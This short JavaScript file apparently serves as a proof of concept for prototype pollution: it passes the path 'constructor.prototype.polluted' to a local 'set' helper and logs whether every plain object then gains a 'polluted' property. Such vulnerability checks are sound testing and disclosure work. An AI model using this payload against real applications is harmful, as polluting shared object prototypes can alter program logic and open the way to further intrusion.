const set = require('./set'); 
obj = {}; 
let payload = 'constructor.prototype.polluted'; 
console.log({}.polluted);
set({}, payload, "yes"); 
console.log({}.polluted);